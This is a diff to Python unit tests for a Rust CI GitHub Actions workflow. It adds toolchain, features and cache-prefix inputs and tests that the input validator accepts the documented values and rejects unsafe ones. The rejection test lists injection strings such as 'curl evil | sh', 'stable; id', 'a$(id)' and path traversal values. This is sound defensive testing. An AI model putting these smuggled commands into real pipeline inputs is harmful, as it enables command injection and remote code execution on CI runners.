@@ -36,6 +36,9 @@ def validate(**inputs: str) -> subprocess.CompletedProcess:
         "IN_CLIPPY": "--workspace --all-targets -- -D warnings",
         "IN_TEST": "--workspace",
         "IN_APT": "",
+        "IN_TOOLCHAIN": "",
+        "IN_FEATURES": "",
+        "IN_PREFIX": "rustc",
     }
     env.update(inputs)
     return subprocess.run(["bash", "-c", step("Validate inputs")["run"]], env=env, capture_output=True, text=True)
@@ -60,7 +63,9 @@ class RustCiWorkflow(unittest.TestCase):
     def test_one_org_wide_namespace_through_the_shared_action(self) -> None:
         cache = step("Compile cache (sccache)")
         self.assertRegex(cache["uses"], r"^SylphxAI/\.github/\.github/actions/rust-sccache@[0-9a-f]{40}$")
-        self.assertEqual(cache["with"]["key-prefix"], "rustc")
+        self.assertEqual(cache["with"]["key-prefix"], "${{ inputs.key-prefix }}")
+        spec = yaml.safe_load(self.text)[True]["workflow_call"]["inputs"]
+        self.assertEqual(spec["key-prefix"]["default"], "rustc")
         self.assertIn("secrets.SYLPHX_CI_CACHE_ACCESS_KEY", cache["with"]["s3-access-key"])
         names = [s.get("name") for s in job()["steps"]]
         self.assertLess(names.index("Rust toolchain"), names.index("Compile cache (sccache)"))
@@ -78,6 +83,17 @@ class RustCiWorkflow(unittest.TestCase):
         self.assertNotIn("path:", yaml.safe_dump(step("Checkout").get("with", {})))
         self.assertEqual(job()["env"]["CARGO_INCREMENTAL"], "0")
 
+    def test_toolchain_input_wins_over_the_pin_file(self) -> None:
+        run = step("Rust toolchain")["run"]
+        self.assertLess(run.index('[ -n "$IN_TOOLCHAIN" ]'), run.index('elif [ -n "$pinned" ]'))
+
+    def test_features_reach_clippy_and_test(self) -> None:
+        for name in ("Clippy", "Test"):
+            run = step(name)["run"]
+            self.assertIn("--all-features", run)
+            self.assertIn('--features "$IN_FEATURES"', run)
+            self.assertIn('"${feat[@]}"', run)
+
     def test_reports_the_hit_rate(self) -> None:
         report = step("Cache report")
         self.assertTrue(report["if"].startswith("always()"))
@@ -89,6 +105,16 @@ class ValidateInputs(unittest.TestCase):
     def test_defaults_pass(self) -> None:
         self.assertEqual(validate().returncode, 0)
 
+    def test_accepts_the_documented_values(self) -> None:
+        for field, ok in (
+            ("IN_TOOLCHAIN", "1.85.0"),
+            ("IN_TOOLCHAIN", "nightly-2026-09-01"),
+            ("IN_FEATURES", "all"),
+            ("IN_FEATURES", "serde,tokio/full"),
+            ("IN_PREFIX", "rustc-2"),
+        ):
+            self.assertEqual(validate(**{field: ok}).returncode, 0, (field, ok))
+
     def test_rejects_shell_in_args(self) -> None:
         for field, bad in (
             ("IN_CLIPPY", "--workspace; curl evil | sh"),
@@ -97,6 +123,12 @@ class ValidateInputs(unittest.TestCase):
             ("IN_WORKSPACE", "../other"),
             ("IN_WORKSPACE", "/etc"),
             ("IN_CLASS", "ubuntu-latest"),
+            ("IN_TOOLCHAIN", "stable; id"),
+            ("IN_FEATURES", "a b"),
+            ("IN_FEATURES", "a$(id)"),
+            ("IN_PREFIX", ""),
+            ("IN_PREFIX", "../x"),
+            ("IN_PREFIX", "a b"),
         ):
             out = validate(**{field: bad})
             self.assertEqual(out.returncode, 2, (field, bad))
